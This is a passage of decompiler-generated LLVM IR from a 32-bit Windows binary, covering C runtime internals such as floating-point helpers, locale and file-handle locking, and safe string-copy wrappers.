  %spec.select = select i1 %6, i32 1, i32 2
  store i32 %spec.select, i32* %eax.0.reg2mem
  br label %dec_label_pc_100239f6

dec_label_pc_100239f6:                            ; preds = %dec_label_pc_100239dd, %dec_label_pc_100239d1
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !10289
}

define i32 @function_10023a05() local_unnamed_addr {
dec_label_pc_10023a05:
  %0 = call i32 @__asm_wait(), !insn.addr !10290
  %1 = call i32 @__asm_fnsave(), !insn.addr !10291
  %2 = sext i32 %1 to i864, !insn.addr !10291
  %3 = call i32 @__powhlp(i864 %2), !insn.addr !10292
  call void @__asm_frstor(i864 %2), !insn.addr !10293
  ret i32 %3, !insn.addr !10294
}

define x86_fp80 @function_10023b38() local_unnamed_addr {
dec_label_pc_10023b38:
  %0 = call x86_fp80 @__decompiler_undefined_function_19()
  ret x86_fp80 %0, !insn.addr !10295
}

define i32 @function_10023b3d() local_unnamed_addr {
dec_label_pc_10023b3d:
  %0 = call i32 @__decompiler_undefined_function_1()
  ret i32 %0, !insn.addr !10296
}

define x86_fp80 @function_10023b46() local_unnamed_addr {
dec_label_pc_10023b46:
  ret x86_fp80 0xK00000000000000000000, !insn.addr !10297
}

define i32 @function_10023b4b() local_unnamed_addr {
dec_label_pc_10023b4b:
  %0 = call i32 @__decompiler_undefined_function_1()
  ret i32 %0, !insn.addr !10298
}

define x86_fp80 @function_10023b58() local_unnamed_addr {
dec_label_pc_10023b58:
  ret x86_fp80 0xK3FFF8000000000000000, !insn.addr !10299
}

define x86_fp80 @function_10023b5f() local_unnamed_addr {
dec_label_pc_10023b5f:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call x86_fp80 @__decompiler_undefined_function_19()
  %2 = add i32 %0, -151, !insn.addr !10300
  %3 = inttoptr i32 %2 to i8*, !insn.addr !10300
  %4 = load i8, i8* %3, align 1, !insn.addr !10300
  %5 = and i8 %4, 64, !insn.addr !10300
  %6 = icmp eq i8 %5, 0, !insn.addr !10300
  %7 = add i32 %0, -144
  %8 = inttoptr i32 %7 to i8*
  store i8 0, i8* %8, align 1
  br i1 %6, label %dec_label_pc_10023b7c, label %dec_label_pc_10023b74, !insn.addr !10301

dec_label_pc_10023b74:                            ; preds = %dec_label_pc_10023b5f
  ret x86_fp80 %1, !insn.addr !10302

dec_label_pc_10023b7c:                            ; preds = %dec_label_pc_10023b5f
  %9 = add i32 %0, -158, !insn.addr !10303
  %10 = inttoptr i32 %9 to x86_fp80*, !insn.addr !10303
  %11 = fadd x86_fp80 %1, 0xK3FFF8000000000000000, !insn.addr !10304
  ret x86_fp80 %11, !insn.addr !10305
}

define x86_fp80 @function_10023b8a() local_unnamed_addr {
dec_label_pc_10023b8a:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call x86_fp80 @__decompiler_undefined_function_19()
  %2 = add i32 %0, -158, !insn.addr !10306
  %3 = inttoptr i32 %2 to x86_fp80*, !insn.addr !10306
  %4 = add i32 %0, -144
  %5 = inttoptr i32 %4 to i8*
  store i8 0, i8* %5, align 1
  %6 = fadd x86_fp80 %1, %1, !insn.addr !10307
  ret x86_fp80 %6, !insn.addr !10308
}

define x86_fp80 @function_10023bb4() local_unnamed_addr {
dec_label_pc_10023bb4:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call x86_fp80 @__decompiler_undefined_function_19()
  %2 = add i32 %0, -151, !insn.addr !10309
  %3 = inttoptr i32 %2 to i8*, !insn.addr !10309
  %4 = load i8, i8* %3, align 1, !insn.addr !10309
  %5 = and i8 %4, 64, !insn.addr !10309
  %6 = icmp eq i8 %5, 0, !insn.addr !10309
  br i1 %6, label %dec_label_pc_10023be9, label %dec_label_pc_10023bc9, !insn.addr !10310

dec_label_pc_10023bc9:                            ; preds = %dec_label_pc_10023bb4
  %7 = load i8, i8* %3, align 1, !insn.addr !10311
  %8 = and i8 %7, 64, !insn.addr !10311
  %9 = icmp eq i8 %8, 0, !insn.addr !10311
  br i1 %9, label %dec_label_pc_10023be9, label %dec_label_pc_10023be0, !insn.addr !10312

dec_label_pc_10023be0:                            ; preds = %dec_label_pc_10023bc9
  %10 = add i32 %0, -144, !insn.addr !10313
  %11 = inttoptr i32 %10 to i8*, !insn.addr !10313
  store i8 0, i8* %11, align 1, !insn.addr !10313
  br label %dec_label_pc_10023bf0, !insn.addr !10314

dec_label_pc_10023be9:                            ; preds = %dec_label_pc_10023bc9, %dec_label_pc_10023bb4
  %12 = add i32 %0, -158, !insn.addr !10315
  %13 = inttoptr i32 %12 to x86_fp80*, !insn.addr !10315
  %14 = add i32 %0, -144, !insn.addr !10316
  %15 = inttoptr i32 %14 to i8*, !insn.addr !10316
  store i8 1, i8* %15, align 1, !insn.addr !10316
  br label %dec_label_pc_10023bf0, !insn.addr !10316

dec_label_pc_10023bf0:                            ; preds = %dec_label_pc_10023be9, %dec_label_pc_10023be0
  %16 = fadd x86_fp80 %1, %1, !insn.addr !10317
  ret x86_fp80 %16, !insn.addr !10318
}

define i32 @function_10023bf3() local_unnamed_addr {
dec_label_pc_10023bf3:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = add i32 %0, -144, !insn.addr !10319
  %3 = inttoptr i32 %2 to i8*, !insn.addr !10319
  %4 = load i8, i8* %3, align 1, !insn.addr !10319
  %5 = icmp eq i8 %4, 0, !insn.addr !10319
  %6 = icmp slt i8 %4, 0, !insn.addr !10319
  %7 = icmp eq i1 %6, false, !insn.addr !10320
  %8 = icmp eq i1 %5, false, !insn.addr !10320
  %9 = icmp eq i1 %7, %8, !insn.addr !10320
  br i1 %9, label %dec_label_pc_10023c0d, label %dec_label_pc_10023c06, !insn.addr !10320

dec_label_pc_10023c06:                            ; preds = %dec_label_pc_10023bf3
  store i8 1, i8* %3, align 1, !insn.addr !10321
  br label %dec_label_pc_10023c0d, !insn.addr !10321

dec_label_pc_10023c0d:                            ; preds = %dec_label_pc_10023c06, %dec_label_pc_10023bf3
  ret i32 %1, !insn.addr !10322
}

define i32 @function_10023c10() local_unnamed_addr {
dec_label_pc_10023c10:
  %0 = call i32 @__decompiler_undefined_function_1()
  ret i32 %0, !insn.addr !10323
}

define i32 @function_10023c2d() local_unnamed_addr {
dec_label_pc_10023c2d:
  %0 = call i32 @__decompiler_undefined_function_1()
  ret i32 %0, !insn.addr !10324
}

declare i32 @__startTwoArgErrorHandling() local_unnamed_addr

declare i32 @__startOneArgErrorHandling() local_unnamed_addr

declare i32 @__twoToTOS() local_unnamed_addr

declare i32 @__load_CW() local_unnamed_addr

declare i32 @__convertTOStoQNaN() local_unnamed_addr

declare i32 @__fload_withFB() local_unnamed_addr

define i32 @__fast_exit(i32 %arg1) local_unnamed_addr {
dec_label_pc_10023d3e:
  %0 = call i32 @__decompiler_undefined_function_1()
  ret i32 %0, !insn.addr !10325
}

declare i32 @__math_exit() local_unnamed_addr

define i32 @function_10023d75() local_unnamed_addr {
dec_label_pc_10023d75:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = and i32 %0, 2146435072, !insn.addr !10326
  ret i32 %1, !insn.addr !10327
}

declare i32 @__check_range_exit() local_unnamed_addr

declare i32 @__powhlp(i864) local_unnamed_addr

define i32 @function_1002416f(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1002416f:
  %0 = icmp ugt i32 %arg2, %arg1
  br i1 %0, label %dec_label_pc_1002417a, label %dec_label_pc_1002417f, !insn.addr !10328

dec_label_pc_1002417a:                            ; preds = %dec_label_pc_1002416f
  ret i32 -1, !insn.addr !10329

dec_label_pc_1002417f:                            ; preds = %dec_label_pc_1002416f
  %1 = icmp ult i32 %arg2, %arg1, !insn.addr !10330
  %2 = zext i1 %1 to i32, !insn.addr !10331
  ret i32 %2, !insn.addr !10332
}

declare i32 @"??$common_expand_argv_wildcards@D@@YAHQAPADQAPAPAD@Z"(i8**, i8***) local_unnamed_addr

define i32 @___acrt_expand_narrow_argv_wildcards() local_unnamed_addr {
dec_label_pc_10024624:
  %0 = call i32 @"??$common_expand_argv_wildcards@D@@YAHQAPADQAPAPAD@Z"(i8** bitcast (i32* @1 to i8**), i8*** bitcast (i32* @1 to i8***)), !insn.addr !10333
  ret i32 %0, !insn.addr !10333
}

define i32 @function_1002462f(i32* %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1002462f:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003bca8, i32 8), !insn.addr !10334
  %2 = add i32 %0, 8, !insn.addr !10335
  %3 = inttoptr i32 %2 to i32*, !insn.addr !10335
  %4 = load i32, i32* %3, align 4, !insn.addr !10335
  %5 = inttoptr i32 %4 to i32*, !insn.addr !10336
  %6 = load i32, i32* %5, align 4, !insn.addr !10336
  %7 = call i32 @___acrt_lock(i32 %6), !insn.addr !10337
  %8 = add i32 %0, -4, !insn.addr !10338
  %9 = inttoptr i32 %8 to i32*, !insn.addr !10338
  store i32 0, i32* %9, align 4, !insn.addr !10338
  %10 = call i32 @function_1002469a(), !insn.addr !10339
  store i32 -2, i32* %9, align 4, !insn.addr !10340
  %11 = call i32 @function_10024666(), !insn.addr !10341
  %12 = call i32 @__SEH_epilog4(), !insn.addr !10342
  ret i32 %12, !insn.addr !10343
}

define i32 @function_10024666() local_unnamed_addr {
dec_label_pc_10024666:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !10344
  %2 = inttoptr i32 %1 to i32*, !insn.addr !10344
  %3 = load i32, i32* %2, align 4, !insn.addr !10344
  %4 = inttoptr i32 %3 to i32*, !insn.addr !10345
  %5 = load i32, i32* %4, align 4, !insn.addr !10345
  %6 = call i32 @___acrt_unlock(i32 %5), !insn.addr !10346
  ret i32 %6, !insn.addr !10347
}

define void @"??$__acrt_lock_and_call@V<lambda_ae742caa10f662c28703da3d2ea5e57e>@@@@YAXW4__acrt_lock_id@@$$QAV<lambda_ae742caa10f662c28703da3d2ea5e57e>@@@Z"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10024672:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = ptrtoint i32* %arg2 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4, !insn.addr !10348
  store i32 %arg1, i32* %stack_var_-16, align 4, !insn.addr !10349
  %2 = call i32 @function_1002462f(i32* nonnull %stack_var_-16, i32 %1, i32* nonnull %stack_var_-12, i32 %arg1, i32 %arg1, i32 %0), !insn.addr !10350
  ret void, !insn.addr !10351
}

define i32 @function_1002469a() local_unnamed_addr {
dec_label_pc_1002469a:
  %ecx.0.reg2mem = alloca i32, !insn.addr !10352
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = load i32, i32* inttoptr (i32 329 to i32*), align 4, !insn.addr !10353
  %2 = add i32 %1, 24, !insn.addr !10354
  %3 = load i32, i32* @global_var_1003ecbc, align 4, !insn.addr !10355
  %4 = call i32 @_memcpy_s.14(i32 %3, i32 257, i32 %2, i32 257), !insn.addr !10356
  %5 = load i32, i32* inttoptr (i32 328 to i32*), align 8, !insn.addr !10357
  %6 = add i32 %5, 281, !insn.addr !10358
  %7 = load i32, i32* @global_var_1003ecc0, align 4, !insn.addr !10359
  %8 = call i32 @_memcpy_s.14(i32 %7, i32 256, i32 %6, i32 256), !insn.addr !10360
  %9 = add i32 %0, 4, !insn.addr !10361
  %10 = inttoptr i32 %9 to i32*, !insn.addr !10361
  %11 = load i32, i32* %10, align 4, !insn.addr !10361
  %12 = inttoptr i32 %11 to i32*, !insn.addr !10362
  %13 = load i32, i32* %12, align 4, !insn.addr !10362
  %14 = inttoptr i32 %13 to i32*, !insn.addr !10363
  %15 = load i32, i32* %14, align 4, !insn.addr !10363
  %16 = inttoptr i32 %15 to i32*, !insn.addr !10364
  %17 = load i32, i32* %16, align 4, !insn.addr !10364
  %18 = add i32 %17, -1, !insn.addr !10364
  %19 = icmp eq i32 %18, 0, !insn.addr !10364
  store i32 %18, i32* %16, align 4, !insn.addr !10364
  %20 = icmp eq i1 %19, false, !insn.addr !10365
  store i32 %17, i32* %ecx.0.reg2mem, !insn.addr !10365
  br i1 %20, label %dec_label_pc_10024703, label %dec_label_pc_100246ee, !insn.addr !10365

dec_label_pc_100246ee:                            ; preds = %dec_label_pc_1002469a
  %21 = load i32, i32* %10, align 4, !insn.addr !10366
  %22 = inttoptr i32 %21 to i32*, !insn.addr !10367
  %23 = load i32, i32* %22, align 4, !insn.addr !10367
  %24 = inttoptr i32 %23 to i32*, !insn.addr !10368
  %25 = load i32, i32* %24, align 4, !insn.addr !10368
  %26 = icmp eq i32 %25, ptrtoint (i32* @global_var_1003d778 to i32), !insn.addr !10368
  store i32 %17, i32* %ecx.0.reg2mem, !insn.addr !10369
  br i1 %26, label %dec_label_pc_10024703, label %dec_label_pc_100246fb, !insn.addr !10369

dec_label_pc_100246fb:                            ; preds = %dec_label_pc_100246ee
  %27 = call i32 @__free_base(i32 %25), !insn.addr !10370
  store i32 %25, i32* %ecx.0.reg2mem, !insn.addr !10371
  br label %dec_label_pc_10024703, !insn.addr !10371

dec_label_pc_10024703:                            ; preds = %dec_label_pc_100246fb, %dec_label_pc_100246ee, %dec_label_pc_1002469a
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %28 = load i32, i32* %10, align 4, !insn.addr !10372
  %29 = inttoptr i32 %28 to i32*, !insn.addr !10373
  %30 = load i32, i32* %29, align 4, !insn.addr !10373
  %31 = add i32 %ecx.0.reload, 72, !insn.addr !10374
  %32 = inttoptr i32 %31 to i32*, !insn.addr !10374
  %33 = load i32, i32* %32, align 4, !insn.addr !10374
  %34 = inttoptr i32 %30 to i32*, !insn.addr !10375
  store i32 %33, i32* %34, align 4, !insn.addr !10375
  %35 = add i32 %30, 72, !insn.addr !10376
  %36 = inttoptr i32 %35 to i32*, !insn.addr !10376
  %37 = load i32, i32* %36, align 4, !insn.addr !10376
  %38 = inttoptr i32 %37 to i32*, !insn.addr !10377
  %39 = load i32, i32* %38, align 4, !insn.addr !10377
  %40 = add i32 %39, 1, !insn.addr !10377
  store i32 %40, i32* %38, align 4, !insn.addr !10377
  ret i32 %37, !insn.addr !10378
}

define i32 @function_10024b87() local_unnamed_addr {
dec_label_pc_10024b87:
  %0 = call i32 @___acrt_unlock(i32 5), !insn.addr !10379
  ret i32 %0, !insn.addr !10380
}

declare i32 @___acrt_initialize_multibyte() local_unnamed_addr

declare i32 @"??$common_set_variable_in_environment_nolock@D@@YAHQADH@Z"(i8*, i32) local_unnamed_addr

define i32 @___dcrt_set_variable_in_narrow_environment_nolock() local_unnamed_addr {
dec_label_pc_10025223:
  %0 = call i32 @"??$common_set_variable_in_environment_nolock@D@@YAHQADH@Z"(i8* bitcast (i32* @1 to i8*), i32 ptrtoint (i32* @1 to i32)), !insn.addr !10381
  ret i32 %0, !insn.addr !10381
}

declare i32 @__recalloc_base(i32, i32, i32) local_unnamed_addr

declare i32 @___acrt_execute_initializers(i32*, i8*) local_unnamed_addr

declare i32 @___acrt_execute_uninitializers(i32*, i8*) local_unnamed_addr

define i32 @function_1002551f() local_unnamed_addr {
dec_label_pc_1002551f:
  %0 = call i32 @___acrt_unlock(i32 7), !insn.addr !10382
  ret i32 %0, !insn.addr !10383
}

declare i32 @___acrt_lowio_lock_fh(i32) local_unnamed_addr

declare i32 @___acrt_lowio_unlock_fh(i32) local_unnamed_addr

define i32 @function_1002570b() local_unnamed_addr {
dec_label_pc_1002570b:
  %0 = call i32 @___acrt_unlock(i32 7), !insn.addr !10384
  ret i32 %0, !insn.addr !10385
}

declare i32 @__get_osfhandle(i32) local_unnamed_addr

declare i32 @___acrt_free_locale(i32) local_unnamed_addr

declare i32 @___acrt_release_locale_ref(i32) local_unnamed_addr

define i32 @function_10025b95() local_unnamed_addr {
dec_label_pc_10025b95:
  %0 = call i32 @___acrt_unlock(i32 4), !insn.addr !10386
  ret i32 %0, !insn.addr !10387
}

declare i32 @__updatetlocinfoEx_nolock() local_unnamed_addr

define i32 @function_10025ffc() local_unnamed_addr {
dec_label_pc_10025ffc:
  %eax.0.reg2mem = alloca i32, !insn.addr !10388
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = add i32 %2, -32, !insn.addr !10388
  %4 = inttoptr i32 %3 to i32*, !insn.addr !10388
  %5 = load i32, i32* %4, align 4, !insn.addr !10388
  %6 = icmp eq i32 %5, 0, !insn.addr !10388
  br i1 %6, label %dec_label_pc_10026027, label %dec_label_pc_10026002, !insn.addr !10389

dec_label_pc_10026002:                            ; preds = %dec_label_pc_10025ffc
  %7 = icmp eq i32 %0, 0, !insn.addr !10390
  br i1 %7, label %dec_label_pc_1002601f, label %dec_label_pc_10026006, !insn.addr !10391

dec_label_pc_10026006:                            ; preds = %dec_label_pc_10026002
  %8 = sdiv i32 %1, 64, !insn.addr !10392
  %9 = and i32 %1, 63, !insn.addr !10393
  %narrow = mul nuw nsw i32 %9, 48
  %10 = mul i32 %8, 4, !insn.addr !10394
  %11 = add i32 %10, ptrtoint (i32* @global_var_1003e8e8 to i32), !insn.addr !10394
  %12 = inttoptr i32 %11 to i32*, !insn.addr !10394
  %13 = load i32, i32* %12, align 4, !insn.addr !10394
  %14 = add nuw nsw i32 %narrow, 40, !insn.addr !10395
  %15 = add i32 %14, %13, !insn.addr !10395
  %16 = inttoptr i32 %15 to i8*, !insn.addr !10395
  %17 = load i8, i8* %16, align 1, !insn.addr !10395
  %18 = and i8 %17, -2, !insn.addr !10395
  store i8 %18, i8* %16, align 1, !insn.addr !10395
  br label %dec_label_pc_1002601f, !insn.addr !10395

dec_label_pc_1002601f:                            ; preds = %dec_label_pc_10026006, %dec_label_pc_10026002
  %19 = call i32 @___acrt_lowio_unlock_fh(i32 %1), !insn.addr !10396
  store i32 %19, i32* %eax.0.reg2mem, !insn.addr !10397
  br label %dec_label_pc_10026027, !insn.addr !10397

dec_label_pc_10026027:                            ; preds = %dec_label_pc_1002601f, %dec_label_pc_10025ffc
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !10398
}

declare i32 @"??$common_tcsncpy_s@_W@@YAHQA_WIQB_WI@Z"(i32*, i32, i32*, i32) local_unnamed_addr

define i32 @_wcsncpy_s() local_unnamed_addr {
dec_label_pc_10028a1a:
  %0 = call i32 @"??$common_tcsncpy_s@_W@@YAHQA_WIQB_WI@Z"(i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32* nonnull @1, i32 ptrtoint (i32* @1 to i32)), !insn.addr !10399
  ret i32 %0, !insn.addr !10399
}

declare i32 @"??$common_tcsncpy_s@D@@YAHQADIQBDI@Z"(i8*, i32, i8*, i32) local_unnamed_addr

define i32 @_strncpy_s() local_unnamed_addr {
dec_label_pc_1002a26f:
  %0 = call i32 @"??$common_tcsncpy_s@D@@YAHQADIQBDI@Z"(i8* bitcast (i32* @1 to i8*), i32 ptrtoint (i32* @1 to i32), i8* bitcast (i32* @1 to i8*), i32 ptrtoint (i32* @1 to i32)), !insn.addr !10400
  ret i32 %0, !insn.addr !10400
}

declare i32 @___libm_error_support() local_unnamed_addr

define i32 @function_1002b074() local_unnamed_addr {
dec_label_pc_1002b074:
  %0 = call i32 @___acrt_initialize_multibyte(), !insn.addr !10401
  %1 = trunc i32 %0 to i8, !insn.addr !10402
  %2 = icmp eq i8 %1, 0, !insn.addr !10402
  %3 = zext i1 %2 to i32, !insn.addr !10403
  ret i32 %3, !insn.addr !10404
}

define i32 @__msize() local_unnamed_addr {
dec_label_pc_1002b083:
  %0 = call i32 @__msize_base(), !insn.addr !10405
  ret i32 %0, !insn.addr !10405
}

declare i32 @__msize_base() local_unnamed_addr

define i32 @__query_app_type() local_unnamed_addr {
dec_label_pc_1002b0c1:
  %0 = load i32, i32* @global_var_1003ecf4, align 4, !insn.addr !10406
  ret i32 %0, !insn.addr !10407
}

define i32 @function_1002b5cf() local_unnamed_addr {
dec_label_pc_1002b5cf:
  %0 = call i32 @__fload_withFB(), !insn.addr !10408
  ret i32 %0, !insn.addr !10408
}

define i32 @function_1002b5d8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1002b5d8:
  %0 = call i1 @__decompiler_undefined_function_5()
  %1 = call i32 @__asm_wait(), !insn.addr !10409
  br i1 %0, label %dec_label_pc_1002b62b, label %dec_label_pc_1002b5df, !insn.addr !10410

dec_label_pc_1002b5df:                            ; preds = %dec_label_pc_1002b5d8
  %2 = and i32 %arg2, 2146435072, !insn.addr !10411
  %3 = icmp eq i32 %2, 0, !insn.addr !10411
  br i1 %3, label %dec_label_pc_1002b656, label %dec_label_pc_1002b5f8, !insn.addr !10412

dec_label_pc_1002b5f8:                            ; preds = %dec_label_pc_1002b5df
  %4 = icmp sgt i32 %arg2, -1, !insn.addr !10413
  %5 = icmp eq i1 %4, false, !insn.addr !10414
  br i1 %5, label %dec_label_pc_1002b671, label %dec_label_pc_1002b605, !insn.addr !10414

dec_label_pc_1002b605:                            ; preds = %dec_label_pc_1002b656, %dec_label_pc_1002b5f8, %dec_label_pc_1002b639
  %6 = load i32, i32* @global_var_1003ebf4, align 4, !insn.addr !10415
  %7 = icmp eq i32 %6, 0, !insn.addr !10415
  %8 = icmp eq i1 %7, false, !insn.addr !10416
  br i1 %8, label %9, label %dec_label_pc_1002b612, !insn.addr !10416

; <label>:9:                                      ; preds = %dec_label_pc_1002b605
  %10 = call i32 @__fast_exit(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10416
  br label %dec_label_pc_1002b612, !insn.addr !10416

dec_label_pc_1002b612:                            ; preds = %9, %dec_label_pc_1002b605
  %11 = call i32 @__math_exit(), !insn.addr !10417
  ret i32 %11, !insn.addr !10417

dec_label_pc_1002b62b:                            ; preds = %dec_label_pc_1002b5d8
  %12 = and i32 %1, 1048575, !insn.addr !10418
  %13 = or i32 %12, %arg1
  %14 = icmp eq i32 %13, 0
  br i1 %14, label %dec_label_pc_1002b639, label %dec_label_pc_1002b64f, !insn.addr !10419

dec_label_pc_1002b639:                            ; preds = %dec_label_pc_1002b62b
  %15 = icmp sgt i32 %1, -1, !insn.addr !10420
  br i1 %15, label %dec_label_pc_1002b605, label %dec_label_pc_1002b671, !insn.addr !10421

dec_label_pc_1002b64f:                            ; preds = %dec_label_pc_1002b62b
  %16 = call i32 @__convertTOStoQNaN(), !insn.addr !10422
  br label %dec_label_pc_1002b671, !insn.addr !10423

dec_label_pc_1002b656:                            ; preds = %dec_label_pc_1002b5df
  %17 = and i32 %arg2, 1048575, !insn.addr !10424
  %18 = or i32 %17, %arg1
  %19 = icmp eq i32 %18, 0
  %20 = icmp sgt i32 %arg2, -1, !insn.addr !10425
  %21 = icmp eq i1 %20, false, !insn.addr !10426
  %or.cond6 = or i1 %21, %19
  br i1 %or.cond6, label %dec_label_pc_1002b671, label %dec_label_pc_1002b605, !insn.addr !10427

dec_label_pc_1002b671:                            ; preds = %dec_label_pc_1002b656, %dec_label_pc_1002b5f8, %dec_label_pc_1002b639, %dec_label_pc_1002b64f
  %22 = load i32, i32* @global_var_1003ebf4, align 4, !insn.addr !10428
  %23 = icmp eq i32 %22, 0, !insn.addr !10428
  %24 = icmp eq i1 %23, false, !insn.addr !10429
  br i1 %24, label %25, label %dec_label_pc_1002b67e, !insn.addr !10429

; <label>:25:                                     ; preds = %dec_label_pc_1002b671
  %26 = call i32 @__fast_exit(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10429
  br label %dec_label_pc_1002b67e, !insn.addr !10429

dec_label_pc_1002b67e:                            ; preds = %25, %dec_label_pc_1002b671
  %27 = call i32 @__startOneArgErrorHandling(), !insn.addr !10430
  ret i32 %27, !insn.addr !10431
}

define i32 @__acos_pentium4(i64 %arg1) local_unnamed_addr {
dec_label_pc_1002ba48:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_3()
  %2 = call i128 @__asm_movlpd.38(i128 %1, i64 %arg1), !insn.addr !10432
  ret i32 %0, !insn.addr !10432
}

define x86_fp80 @function_1002ba4e(i64 %arg1) local_unnamed_addr {
dec_label_pc_1002ba4e:
  %xmm1.0.reg2mem = alloca i128, !insn.addr !10433
  %storemerge.reg2mem = alloca i32, !insn.addr !10433
  %xmm0.0.reg2mem = alloca i128, !insn.addr !10433
  %0 = call double @__decompiler_undefined_function_12()
  %1 = load i128, i128* @global_var_10038830, align 4
  %2 = load i128, i128* @global_var_10038840, align 4
  %3 = load i128, i128* @global_var_100388a0, align 4
  %4 = load i128, i128* @global_var_10038850, align 4
  %5 = load i128, i128* @global_var_10038860, align 4
  %6 = load i128, i128* @global_var_100388b0, align 4
  %7 = trunc i128 %3 to i64
  store i32 -1023, i32* %storemerge.reg2mem, !insn.addr !10433
  br label %dec_label_pc_1002ba53, !insn.addr !10433

dec_label_pc_1002ba53:                            ; preds = %dec_label_pc_1002bc26, %dec_label_pc_1002ba4e
  %xmm0.0.reload = load i128, i128* %xmm0.0.reg2mem
  %8 = call i128 @__asm_movapd(i128 %xmm0.0.reload), !insn.addr !10434
  %9 = call i128 @__asm_unpcklpd(i128 %xmm0.0.reload, i128 %xmm0.0.reload), !insn.addr !10435
  %10 = call i128 @__asm_psrlq(i128 %8, i32 52), !insn.addr !10436
  %11 = call i32 @__asm_pextrw(i128 %10, i32 0), !insn.addr !10437
  %12 = call i128 @__asm_movapd(i128 %1), !insn.addr !10438
  %13 = call i128 @__asm_movapd(i128 %2), !insn.addr !10439
  %14 = call i128 @__asm_movapd(i128 %3), !insn.addr !10440
  %15 = call i128 @__asm_movapd(i128 %4), !insn.addr !10441
  %16 = call i128 @__asm_movapd(i128 %5), !insn.addr !10442
  %17 = call i128 @__asm_andpd(i128 %9, i128 %12), !insn.addr !10443
  %18 = call i128 @__asm_orpd(i128 %17, i128 %14), !insn.addr !10444
  %19 = call i128 @__asm_addpd(i128 %15, i128 %18), !insn.addr !10445
  %20 = call i32 @__asm_pextrw(i128 %19, i32 0), !insn.addr !10446
  %21 = and i32 %20, 2032, !insn.addr !10447
  %22 = add i32 %21, ptrtoint (i128** @global_var_10038d40 to i32), !insn.addr !10448
  %23 = inttoptr i32 %22 to i128*, !insn.addr !10448
  %24 = load i128, i128* %23, align 4, !insn.addr !10448
  %25 = call i128 @__asm_movapd(i128 %24), !insn.addr !10448
  %26 = add i32 %21, ptrtoint (i128** @global_var_10038930 to i32), !insn.addr !10449
  %27 = inttoptr i32 %26 to i128*, !insn.addr !10449
  %28 = load i128, i128* %27, align 4, !insn.addr !10449
  %29 = call i128 @__asm_movapd(i128 %28), !insn.addr !10449
  %30 = call i128 @__asm_andpd(i128 %16, i128 %18), !insn.addr !10450
  %31 = call i128 @__asm_subpd(i128 %18, i128 %30), !insn.addr !10451
  %32 = call i128 @__asm_mulpd(i128 %30, i128 %25), !insn.addr !10452
  %33 = call i128 @__asm_subpd(i128 %32, i128 %13), !insn.addr !10453
  %34 = call i128 @__asm_addsd(i128 %29, i128 %33), !insn.addr !10454
  %35 = call i128 @__asm_mulpd(i128 %31, i128 %25), !insn.addr !10455
  %36 = call i128 @__asm_movapd(i128 %35), !insn.addr !10456
  %37 = call i128 @__asm_addpd(i128 %35, i128 %33), !insn.addr !10457
  %38 = and i32 %11, 4095, !insn.addr !10458
  %39 = add nsw i32 %38, -1, !insn.addr !10459
  %40 = icmp ult i32 %39, 2046
  br i1 %40, label %dec_label_pc_1002bae8, label %dec_label_pc_1002bba6, !insn.addr !10460

dec_label_pc_1002bae8:                            ; preds = %dec_label_pc_1002ba53
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %41 = add nsw i32 %38, %storemerge.reload, !insn.addr !10461
  %42 = call i128 @__asm_cvtsi2sd(i32 %41), !insn.addr !10462
  %43 = call i128 @__asm_unpcklpd(i128 %42, i128 %42), !insn.addr !10463
  %44 = mul i32 %41, 1024, !insn.addr !10464
  %45 = sub nsw i32 0, %44, !insn.addr !10465
  %46 = icmp eq i32 %21, %45, !insn.addr !10466
  %47 = load i128, i128* @global_var_100388f0, align 4, !insn.addr !10467
  %48 = call i128 @__asm_movapd(i128 %47), !insn.addr !10467
  %49 = call i128 @__asm_movapd(i128 %37), !insn.addr !10468
  %50 = load i128, i128* @global_var_10038900, align 4, !insn.addr !10469
  %51 = call i128 @__asm_movapd(i128 %50), !insn.addr !10469
  %52 = call i128 @__asm_mulpd(i128 %48, i128 %37), !insn.addr !10470
  %53 = call i128 @__asm_mulpd(i128 %49, i128 %49), !insn.addr !10471
  %54 = call i128 @__asm_addpd(i128 %52, i128 %51), !insn.addr !10472
  %55 = load i128, i128* @global_var_10038910, align 4, !insn.addr !10473
  %56 = call i128 @__asm_movapd(i128 %55), !insn.addr !10473
  %57 = call i128 @__asm_mulsd(i128 %53, i128 %53), !insn.addr !10474
  %58 = load i128, i128* @global_var_10038870, align 4, !insn.addr !10475
  %59 = call i128 @__asm_movapd(i128 %58), !insn.addr !10475
  %60 = call i128 @__asm_mulpd(i128 %43, i128 %59), !insn.addr !10476
  %61 = select i1 %46, i32 add (i32 ptrtoint (i128** @global_var_10038880 to i32), i32 16), i32 ptrtoint (i128** @global_var_10038880 to i32), !insn.addr !10477
  %62 = inttoptr i32 %61 to i128*, !insn.addr !10477
  %63 = load i128, i128* %62, align 4, !insn.addr !10477
  %64 = call i128 @__asm_movapd(i128 %63), !insn.addr !10477
